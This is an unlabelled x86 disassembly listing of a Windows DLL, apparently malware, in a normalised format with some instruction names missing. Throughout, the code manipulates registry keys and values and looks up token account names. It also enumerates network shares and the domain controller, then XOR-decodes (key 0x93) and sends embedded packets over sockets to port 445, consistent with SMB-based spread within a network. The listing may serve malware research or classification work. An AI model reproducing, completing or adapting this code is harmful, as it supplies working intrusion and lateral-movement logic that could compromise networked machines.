or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
lea esi [ ecx + edx + 0x1 ]
or ecx 0xffffffff
mov edi esi
[ edi ]
not ecx
dec ecx
lea eax [ ecx + esi + 0x1 ]
mov ecx [ ecx + esi + 0x5 ]
push ecx
lea ecx [ eax + 0x8 ]
mov eax [ eax ]
push ecx
mov ecx [ ebx ]
push eax
push esi
push edx
push ecx
call sub_10007890
add esp 0x18
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_10006030
pop edi
pop esi
pop ebx
retn
sub_10007630
push esi
mov esi [ rw-data ]
push edi
or ecx 0xffffffff
lea edx [ esi + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
mov eax [ esi ]
push edx
push eax
call sub_100077d0
add esp 0xc
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_10006030
pop edi
pop esi
retn
sub_10007670
push esi
mov esi [ rw-data ]
push edi
or ecx 0xffffffff
lea edx [ esi + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
mov eax [ esi ]
push edx
push eax
call sub_10007840
add esp 0xc
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_10006030
pop edi
pop esi
retn
sub_100076b0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
lea eax [ esp + 0xc ]
push esi
xor esi esi
push eax
push 0xf003f
push esi
push ecx
push edx
xor ebx ebx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push ebp
mov ebp [ esp + 0x18 ]
push edi
pop esi
xor eax eax
pop ebx
retn
mov edx [ esp + 0x18 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
mov eax esi
pop ebp
pop esi
pop ebx
retn
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
inc ebx
lea esi [ esi + ecx + 0x1 ]
jmp r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
lea edi [ esi + ebp ]
push 0x0
push eax
push edi
push ebx
push ecx
mov [ esp + 0x34 ] 0x104
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
sub_10007730
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
lea eax [ esp + 0x8 ]
push esi
xor esi esi
push eax
push 0xf003f
push esi
push ecx
push edx
xor ebx ebx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push ebp
mov ebp [ RegEnumValueA@IAT ]
push edi
mov edi [ esp + 0x1c ]
pop esi
xor eax eax
pop ebx
retn
mov edx [ esp + 0x14 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
mov eax esi
pop ebp
pop esi
pop ebx
retn
mov eax [ esp + 0x18 ]
inc ebx
mov [ esi + edi + 0x104 ] eax
mov ecx [ esp + 0x18 ]
lea esi [ esi + ecx + 0x108 ]
jmp r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ edi + esi + 0x108 ]
push eax
lea edx [ edi + esi + 0x100 ]
push ecx
push edx
mov edx [ esp + 0x20 ]
lea eax [ esp + 0x28 ]
push 0x0
lea ecx [ esi + edi ]
push eax
push ecx
push ebx
push edx
mov [ esp + 0x3c ] 0x100
mov [ esp + 0x38 ] 0x2800
call ebp
test eax eax
jne r-xdata
sub_100077d0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
sub esp 0x20
lea eax [ esp + 0x28 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
push esi
push eax
push ecx
call [ SHDeleteKeyA@IAT ]
mov esi eax
lea edx [ esp + 0x4 ]
push esi
push rw-data
push edx
call [ sprintf@IAT ]
mov eax [ esp + 0x38 ]
add esp 0xc
push eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
add esp 0x20
retn
xor eax eax
add esp 0x20
retn
sub_10007840
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push esi
push eax
push ecx
call [ RegDeleteValueA@IAT ]
mov edx [ esp + 0xc ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
retn
xor eax eax
retn
sub_10007890
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push esi
push eax
mov eax [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
push 0x0
push eax
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0xc ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
retn
xor eax eax
retn
sub_100078f0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
push esi
mov edx [ esp + 0xc ]
push edi
lea eax [ esp + 0xc ]
push 0x0
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push ecx
push edx
call [ RegCreateKeyExA@IAT ]
mov edi [ RegCloseKey@IAT ]
mov esi eax
mov eax [ esp + 0x10 ]
push eax
call edi
mov ecx [ esp + 0xc ]
push ecx
call edi
xor eax eax
pop edi
test esi esi
sete al
pop esi
retn
xor eax eax
retn
sub_10007960
sub esp 0x4c4
mov ecx [ esp + 0x4c8 ]
lea eax [ esp + 0x4 ]
push eax
push 0x20008
push ecx
mov [ esp + 0x14 ] 0x100
mov [ esp + 0xc ] 0xc8
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
push edx
lea eax [ esp + 0xe0 ]
push 0x3e8
push eax
push 0x1
push ecx
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
add esp 0x4c4
retn
lea edx [ esp + 0x10 ]
lea eax [ esp ]
push edx
lea ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x4d4 ]
lea edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0xe8 ]
push edx
push eax
push ecx
push 0x0
call [ LookupAccountSidA@IAT ]
neg eax
sbb eax eax
neg eax
add esp 0x4c4
retn
add esp 0x4c4
retn
sub_10007a00
mov eax 0x423c
call sub_10008f00
push ebx
mov eax 0x2
push ebp
push esi
mov [ esp + 0x24 ] eax
mov [ esp + 0x30 ] eax
mov eax [ rw-data ]
push edi
xor ebp ebp
push rw-data
push eax
mov [ esp + 0x34 ] ebp
mov [ esp + 0x38 ] 0x3
mov [ esp + 0x40 ] ebp
mov [ esp + 0x44 ] ebp
mov [ esp + 0x48 ] ebp
mov [ esp + 0x4c ] ebp
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] 0x4000
mov [ esp + 0x20 ] 0xffffffff
mov ebx 0x5
mov [ esp + 0x254 ] 0x47
call [ strstr@IAT ]
add esp 0x8
mov edi eax
cmp edi ebp
push 0x5c
je r-xdata
mov ecx [ rw-data ]
mov esi [ strrchr@IAT ]
push ecx
call esi
add esp 0x8
cmp eax ebp
je r-xdata
mov esi [ strchr@IAT ]
lea ecx [ edi + 0x3 ]
push ecx
call esi
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov [ esp + 0x251 ] 0x0
mov ebx 0x6
mov [ eax ] 0x0
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
lea edx [ ebp + 0x1 ]
push 0x5c
push edx
call esi
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x1c ]
lea eax [ esp + 0x28 ]
push edx
push eax
push ebp
push ebp
push 0x2
call WNetOpenEnumA
test eax eax
jne r-xdata
push 0x5c
push ecx
call esi
add esp 0x8
cmp eax ebp
je r-xdata
inc edi
mov [ ebp ] 0x0
mov [ esp + 0x3c ] edi
xor ebp ebp
jmp r-xdata
inc edi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ rw-data ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call sub_10005bf0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x423c
retn
mov ecx [ esp + 0x14 ]
push ecx
push 0x40
call [ GlobalAlloc@IAT ]
mov esi eax
mov [ esp + 0x24 ] esi
mov edx [ rw-data ]
lea ecx [ eax + 0x1 ]
cmp edx 0x2
mov [ esp + 0x3c ] ecx
jne r-xdata
push esi
call [ rw-data ]
mov edx [ esp + 0x1c ]
push edx
call WNetCloseEnum
cmp ebx 0x5
jne r-xdata
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x18 ]
test eax eax
jbe r-xdata
cmp eax [ rw-data ]
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
lea eax [ esp + 0x48 ]
lea ecx [ esp + 0x251 ]
push eax
lea edx [ ebx - 0x5 ]
push ecx
lea eax [ esp + 0x259 ]
push edx
push eax
mov [ esp + 0x25d ] ebx
call sub_10004780
lea ecx [ esp + 0x25c ]
push ebx
push ecx
call sub_10003f40
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
add esp 0x423c
retn
mov ecx [ esp + 0x14 ]
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x1c ]
push esi
push ecx
push edx
call WNetEnumResourceA
test eax eax
jne r-xdata
lea ebp [ esi + 0x14 ]
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x30 ] 0x6
mov [ esp + 0x34 ] 0x80000002
mov [ esp + 0x44 ] ecx
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x18 ]
inc eax
add ebp 0x20
cmp eax ecx
mov [ esp + 0x20 ] eax
jb r-xdata
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
mov eax [ ebp ]
test eax eax
je r-xdata
jmp r-xdata
mov edi [ ebp ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebx + 0x24c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp ]
or ecx 0xffffffff
mov edi edx
[ edi ]
mov eax [ esp + 0x10 ]
not ecx
dec ecx
add ebx ecx
test eax eax
je r-xdata
add eax 0x2
push 0x5c
push eax
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov esi [ esp + 0x24 ]
inc ebx
mov [ esp + ebx + 0x24c ] ecx
add ebx 0x4
lea ecx [ esp + 0x4c ]
push ecx
push edx
call sub_10007d10
lea edi [ esp + 0x54 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x24c ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add ebx ecx
inc eax
mov [ ebp ] eax
sub_10007d30
sub esp 0x358
mov ecx 0x22
xor eax eax
push esi
push edi
mov esi rw-data
lea edi [ esp + 0x44 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x2a
mov esi rw-data
lea edi [ esp + 0xd0 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx 0x37
mov esi rw-data
lea edi [ esp + 0x17c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov cl [ esp + eax + 0x44 ]
xor cl 0x93
mov [ esp + eax + 0x44 ] cl
inc eax
cmp eax 0x89
jb r-xdata
xor eax eax
mov cl [ esp + eax + 0xd0 ]
xor cl 0x93
mov [ esp + eax + 0xd0 ] cl
inc eax
cmp eax 0xa8
jb r-xdata
xor eax eax
mov cl [ esp + eax + 0x17c ]
xor cl 0x93
mov [ esp + eax + 0x17c ] cl
inc eax
cmp eax 0xde
jb r-xdata
mov eax [ esp + 0x364 ]
push eax
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x24 ]
mov edi rw-data
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ inet_ntoa@IAT ]
lea edx [ esp + 0x24 ]
mov edi eax
jmp r-xdata
mov edi 0x1
push 0x0
push edi
push 0x2
call [ socket@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi [ esp + 0x368 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x358
retn
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov al [ esp + 0x24 ]
test al al
jne r-xdata
push 0x1bd
mov [ esp + 0x18 ] 0x2
call [ htons@IAT ]
lea edx [ esp + 0x24 ]
mov [ esp + 0x16 ] ax
push edx
call [ inet_addr@IAT ]
mov [ esp + 0x18 ] eax
lea ecx [ esp + 0x8 ]
xor eax eax
push ecx
mov [ esp + 0x20 ] eax
push 0x8004667e
push esi
mov [ esp + 0x2c ] eax
mov [ esp + 0x14 ] edi
call [ ioctlsocket@IAT ]
lea edx [ esp + 0x14 ]
push 0x10
push edx
push esi
mov [ esp + 0x18 ] 0x2
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x26c ] esi
mov [ esp + 0x268 ] edi
call [ connect@IAT ]
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x25c ]
push eax
push 0x0
push ecx
lea edx [ esi + 0x1 ]
push 0x0
push edx
call [ select@IAT ]
test eax eax
jg r-xdata
mov ecx [ esp + 0x368 ]
lea eax [ esp + 0x24 ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
pop edi
pop esi
add esp 0x358
retn
push edi
mov edi [ esp + 0x36c ]
lea edx [ esp + 0x28 ]
push edi
push edx
lea eax [ esp + 0x50 ]
push 0x89
push eax
push esi
call sub_10007fb0
add esp 0x18
test eax eax
je r-xdata
mov ecx [ esp + 0x368 ]
lea eax [ esp + 0x24 ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
push esi
call [ closesocket@IAT ]
pop edi
pop esi
add esp 0x358
retn
pop edi
pop esi
add esp 0x358
retn
push 0x2
lea ecx [ esp + 0x28 ]
push edi
push ecx
lea edx [ esp + 0xdc ]
push 0xa8
push edx
push esi
call sub_10007fb0
add esp 0x18
test eax eax
je r-xdata
push 0x3
lea eax [ esp + 0x28 ]
push edi
push eax
lea ecx [ esp + 0x188 ]
push 0xde
push ecx
push esi
call sub_10007fb0
add esp 0x18
push esi
call [ closesocket@IAT ]
sub_10007fb0
mov eax 0x1120
call sub_10008f00
push ebx
push ebp
mov ebp [ ioctlsocket@IAT ]
push esi
mov esi [ esp + 0x1130 ]
lea eax [ esp + 0xc ]
push edi
push eax
mov edi 0x1
push 0x8004667e
push esi
mov [ esp + 0x1c ] edi
call ebp
mov ecx [ esp + 0x113c ]
mov edx [ esp + 0x1138 ]
push 0x0
push ecx
push edx
push esi
mov [ esp + 0x24 ] 0x2
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x40 ] esi
mov [ esp + 0x3c ] edi
call [ rw-data ]
mov ebx [ select@IAT ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x30 ]
push 0x0
lea edi [ esi + 0x1 ]
push ecx
push 0x0
push edi
call ebx
test eax eax
jg r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x1
push ecx
push 0x8004667e
push esi
call ebp
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x2c ]
push edx
push 0x0
push 0x0
push eax
push edi
mov [ esp + 0x28 ] 0x4
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x44 ] esi
mov [ esp + 0x40 ] 0x1
call ebx
test eax eax
jle r-xdata
mov edx [ esp + 0x1140 ]
push edx
push rw-data
jmp r-xdata
mov edx [ esp + 0x1140 ]
push edx
push rw-data
push 0x0
lea ecx [ esp + 0x134 ]
push 0x640
push ecx
push esi
call [ recv@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x114c ]
push eax
call [ sprintf@IAT ]
add esp 0xc
push esi
call [ closesocket@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1120
retn
cmp [ esp + 0x1148 ] 0x3
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1120
retn
xor eax eax
lea ecx [ esp + 0x160 ]
mov dl [ ecx ]
add ecx 0x2
mov [ esp + eax + 0x1c ] dl
inc eax
cmp eax 0xc
jl r-xdata
mov ecx [ esp + 0x1140 ]
mov edx [ esp + 0x1144 ]
mov [ esp + eax + 0x1c ] 0x0
lea eax [ esp + 0x1c ]
push eax
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x10
sub_10008160
mov eax [ rw-data ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ rw-data ]
push esi
mov esi [ free@IAT ]
cmp eax edi
je r-xdata
push eax
call [ closesocket@IAT ]
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
add esp 0x4
mov [ rw-data ] edi
mov eax [ rw-data ]
pop esi
cmp eax edi
je r-xdata
push eax
call esi
add esp 0x4
mov [ rw-data ] edi
pop edi
retn
cmp [ rw-data ] edi
jne r-xdata
push eax
call [ ReleaseMutex@IAT ]
cmp eax edi
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] edi
sub_100081e0
push ecx
cmp [ rw-data ] 0x2
jne r-xdata
pop ecx
retn
lea eax [ esp ]
mov [ esp ] 0x0
push eax
push 0x0
push 0x0
call NetGetDCName
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
mov ecx [ esp ]
push ecx
push rw-data
push rw-data
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
push eax
call NetApiBufferFree
mov eax [ esp ]
test eax eax
je r-xdata
sub_10008240
mov eax [ esp + 0x4 ]
push esi
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push ebx
push ebp
push edi
mov edi [ fread@IAT ]
mov ebx 0x1
push esi
push ebx
lea ecx [ esp + 0x1c ]
push ebx
push ecx
call edi
add esp 0x10
test eax eax
je r-xdata
pop esi
retn
push esi
call [ fclose@IAT ]
add esp 0x4
mov eax ebx
pop edi
pop ebp
pop ebx
pop esi
retn
mov ebp [ isalpha@IAT ]
push esi
push 0x1
lea ecx [ esp + 0x1c ]
push 0x1
push ecx
call edi
add esp 0x10
test eax eax
je r-xdata
movsx eax [ esp + 0x14 ]
push eax
call [ isdigit@IAT ]
add esp 0x4
test eax eax
jne r-xdata
jmp r-xdata
mov al [ esp + 0x14 ]
cmp al 0x2b
je r-xdata
movsx edx [ esp + 0x14 ]
push edx
call ebp
add esp 0x4
test eax eax
jne r-xdata
cmp al 0x2f
je r-xdata
cmp al 0x3d
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xa
jne r-xdata
xor ebx ebx
sub_100082f0
sub esp 0x110
push ebx
mov ebx 0xff
push esi
push edi
mov [ esp + 0x14 ] bl
mov [ esp + 0x15 ] bl
mov [ esp + 0x16 ] bl
mov [ esp + 0x17 ] bl
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] bl
mov [ esp + 0x1a ] bl
mov [ esp + 0x1b ] bl
mov [ esp + 0x1c ] bl
mov [ esp + 0x1d ] bl
mov [ esp + 0x1e ] bl
mov [ esp + 0x1f ] bl
mov [ esp + 0x20 ] bl
mov [ esp + 0x21 ] bl
mov [ esp + 0x22 ] bl
mov [ esp + 0x23 ] bl
mov [ esp + 0x24 ] bl
mov [ esp + 0x25 ] bl
mov [ esp + 0x26 ] bl
mov [ esp + 0x27 ] bl
mov [ esp + 0x28 ] bl
mov [ esp + 0x29 ] bl
mov [ esp + 0x2a ] bl
mov [ esp + 0x2b ] bl
mov [ esp + 0x2c ] bl
mov [ esp + 0x2d ] bl
mov [ esp + 0x2e ] bl
mov [ esp + 0x2f ] bl
mov [ esp + 0x30 ] bl
mov [ esp + 0x31 ] bl
mov [ esp + 0x32 ] bl
mov [ esp + 0x33 ] bl
mov [ esp + 0x34 ] bl
mov [ esp + 0x35 ] bl
mov [ esp + 0x36 ] bl
mov [ esp + 0x37 ] bl
mov [ esp + 0x38 ] bl
mov [ esp + 0x39 ] bl
mov [ esp + 0x3a ] bl
mov [ esp + 0x3b ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] bl
mov [ esp + 0x3e ] bl
mov [ esp + 0x3f ] 0x3e
mov [ esp + 0x40 ] bl
mov [ esp + 0x41 ] bl
mov [ esp + 0x42 ] bl
mov [ esp + 0x43 ] 0x3f
mov [ esp + 0x44 ] 0x34
mov [ esp + 0x45 ] 0x35
mov [ esp + 0x46 ] 0x36
mov [ esp + 0x47 ] 0x37
mov [ esp + 0x48 ] 0x38
mov [ esp + 0x49 ] 0x39
mov [ esp + 0x4a ] 0x3a
mov [ esp + 0x4b ] 0x3b
mov [ esp + 0x4c ] 0x3c
mov [ esp + 0x4d ] 0x3d
mov [ esp + 0x4e ] bl
mov [ esp + 0x4f ] bl
mov [ esp + 0x50 ] bl
mov [ esp + 0x51 ] bl
mov [ esp + 0x52 ] bl
mov [ esp + 0x53 ] bl
mov [ esp + 0x54 ] bl
mov [ esp + 0x55 ] 0x0
mov [ esp + 0x56 ] 0x1
mov [ esp + 0x57 ] 0x2
mov [ esp + 0x58 ] 0x3
mov [ esp + 0x59 ] 0x4
mov [ esp + 0x5a ] 0x5
mov [ esp + 0x5b ] 0x6
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x5d ] 0x8
mov [ esp + 0x5e ] 0x9
mov [ esp + 0x5f ] 0xa
mov [ esp + 0x60 ] 0xb
mov [ esp + 0x61 ] 0xc
mov [ esp + 0x62 ] 0xd
mov [ esp + 0x63 ] 0xe
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x65 ] 0x10
mov [ esp + 0x66 ] 0x11
mov [ esp + 0x67 ] 0x12
mov [ esp + 0x68 ] 0x13
mov [ esp + 0x69 ] 0x14
mov [ esp + 0x6a ] 0x15
mov [ esp + 0x6b ] 0x16
mov [ esp + 0x6c ] 0x17
mov [ esp + 0x6d ] 0x18
mov [ esp + 0x6e ] 0x19
mov [ esp + 0x6f ] bl
mov [ esp + 0x70 ] bl
mov [ esp + 0x71 ] bl
mov [ esp + 0x72 ] bl
mov [ esp + 0x73 ] bl
mov [ esp + 0x74 ] bl
mov [ esp + 0x75 ] 0x1a
mov [ esp + 0x76 ] 0x1b
mov [ esp + 0x77 ] 0x1c
mov [ esp + 0x78 ] 0x1d
mov [ esp + 0x79 ] 0x1e
mov [ esp + 0x7a ] 0x1f
mov [ esp + 0x7b ] 0x20
mov [ esp + 0x7c ] 0x21
mov [ esp + 0x7d ] 0x22
mov [ esp + 0x7e ] 0x23
mov [ esp + 0x7f ] 0x24
mov [ esp + 0x80 ] 0x25
mov [ esp + 0x81 ] 0x26
mov [ esp + 0x82 ] 0x27
mov [ esp + 0x83 ] 0x28
mov [ esp + 0x84 ] 0x29
mov [ esp + 0x85 ] 0x2a
mov [ esp + 0x86 ] 0x2b
mov [ esp + 0x87 ] 0x2c
mov [ esp + 0x88 ] 0x2d
mov [ esp + 0x89 ] 0x2e
mov [ esp + 0x8a ] 0x2f
mov [ esp + 0x8b ] 0x30
mov [ esp + 0x8c ] 0x31
mov [ esp + 0x8d ] 0x32
mov [ esp + 0x8e ] 0x33
mov [ esp + 0x8f ] bl
mov [ esp + 0x90 ] bl
mov [ esp + 0x91 ] bl
mov [ esp + 0x92 ] bl
mov [ esp + 0x93 ] bl
mov [ esp + 0x94 ] bl
mov [ esp + 0x95 ] bl
mov [ esp + 0x96 ] bl
mov [ esp + 0x97 ] bl
mov [ esp + 0x98 ] bl
mov [ esp + 0x99 ] bl
mov [ esp + 0x9a ] bl
mov [ esp + 0x9b ] bl
mov [ esp + 0x9c ] bl
mov [ esp + 0x9d ] bl
mov [ esp + 0x9e ] bl
mov [ esp + 0x9f ] bl
mov [ esp + 0xa0 ] bl
mov [ esp + 0xa1 ] bl
mov [ esp + 0xa2 ] bl
mov [ esp + 0xa3 ] bl
mov [ esp + 0xa4 ] bl
mov [ esp + 0xa5 ] bl
mov [ esp + 0xa6 ] bl
mov [ esp + 0xa7 ] bl
mov [ esp + 0xa8 ] bl
mov [ esp + 0xa9 ] bl
mov [ esp + 0xaa ] bl
mov [ esp + 0xab ] bl
mov [ esp + 0xac ] bl
mov [ esp + 0xad ] bl
mov [ esp + 0xae ] bl
mov [ esp + 0xaf ] bl
mov [ esp + 0xb0 ] bl
mov [ esp + 0xb1 ] bl
mov [ esp + 0xb2 ] bl
mov [ esp + 0xb3 ] bl
mov [ esp + 0xb4 ] bl
mov [ esp + 0xb5 ] bl
mov [ esp + 0xb6 ] bl
mov [ esp + 0xb7 ] bl
mov [ esp + 0xb8 ] bl
mov [ esp + 0xb9 ] bl
mov [ esp + 0xba ] bl
mov [ esp + 0xbb ] bl
mov [ esp + 0xbc ] bl
mov [ esp + 0xbd ] bl
mov [ esp + 0xbe ] bl
mov [ esp + 0xbf ] bl
mov [ esp + 0xc0 ] bl
mov [ esp + 0xc1 ] bl
mov [ esp + 0xc2 ] bl
mov [ esp + 0xc3 ] bl
mov [ esp + 0xc4 ] bl
mov [ esp + 0xc5 ] bl
mov [ esp + 0xc6 ] bl
mov [ esp + 0xc7 ] bl
mov [ esp + 0xc8 ] bl
mov [ esp + 0xc9 ] bl
mov [ esp + 0xca ] bl
mov [ esp + 0xcb ] bl
mov [ esp + 0xcc ] bl
mov [ esp + 0xcd ] bl
mov [ esp + 0xce ] bl
mov [ esp + 0xcf ] bl
mov [ esp + 0xd0 ] bl
mov [ esp + 0xd1 ] bl
mov [ esp + 0xd2 ] bl
mov [ esp + 0xd3 ] bl
mov [ esp + 0xd4 ] bl
mov [ esp + 0xd5 ] bl
mov [ esp + 0xd6 ] bl
mov [ esp + 0xd7 ] bl
mov [ esp + 0xd8 ] bl
mov [ esp + 0xd9 ] bl
mov [ esp + 0xda ] bl
mov [ esp + 0xdb ] bl
mov [ esp + 0xdc ] bl
mov [ esp + 0xdd ] bl
mov [ esp + 0xde ] bl
mov [ esp + 0xdf ] bl
mov [ esp + 0xe0 ] bl
mov [ esp + 0xe1 ] bl
mov [ esp + 0xe2 ] bl
mov [ esp + 0xe3 ] bl
mov [ esp + 0xe4 ] bl
mov [ esp + 0xe5 ] bl
mov [ esp + 0xe6 ] bl
mov [ esp + 0xe7 ] bl
mov [ esp + 0xe8 ] bl
mov [ esp + 0xe9 ] bl
mov [ esp + 0xea ] bl
mov [ esp + 0xeb ] bl
mov [ esp + 0xec ] bl
mov [ esp + 0xed ] bl
mov [ esp + 0xee ] bl
mov [ esp + 0xef ] bl
mov [ esp + 0xf0 ] bl
mov [ esp + 0xf1 ] bl
mov [ esp + 0xf2 ] bl
mov [ esp + 0xf3 ] bl
mov [ esp + 0xf4 ] bl
mov [ esp + 0xf5 ] bl
mov [ esp + 0xf6 ] bl
mov [ esp + 0xf7 ] bl
mov [ esp + 0xf8 ] bl
mov [ esp + 0xf9 ] bl
mov [ esp + 0xfa ] bl
mov [ esp + 0xfb ] bl
mov [ esp + 0xfc ] bl
mov [ esp + 0xfd ] bl
mov [ esp + 0xfe ] bl
mov [ esp + 0xff ] bl
mov [ esp + 0x100 ] bl
mov [ esp + 0x101 ] bl
mov [ esp + 0x102 ] bl
mov eax [ esp + 0x120 ]
mov esi [ fopen@IAT ]
push rw-data
push eax
mov [ esp + 0x10b ] bl
mov [ esp + 0x10c ] bl
mov [ esp + 0x10d ] bl
mov [ esp + 0x10e ] bl
mov [ esp + 0x10f ] bl
mov [ esp + 0x110 ] bl
mov [ esp + 0x111 ] bl
mov [ esp + 0x112 ] bl
mov [ esp + 0x113 ] bl
mov [ esp + 0x114 ] bl
mov [ esp + 0x115 ] bl
mov [ esp + 0x116 ] bl
mov [ esp + 0x117 ] bl
mov [ esp + 0x118 ] bl
mov [ esp + 0x119 ] bl
mov [ esp + 0x11a ] bl
mov [ esp + 0x11b ] bl
call esi
mov ecx [ esp + 0x12c ]
push rw-data
push ecx
mov edi eax
call esi
xor esi esi
add esp 0x10
cmp edi esi
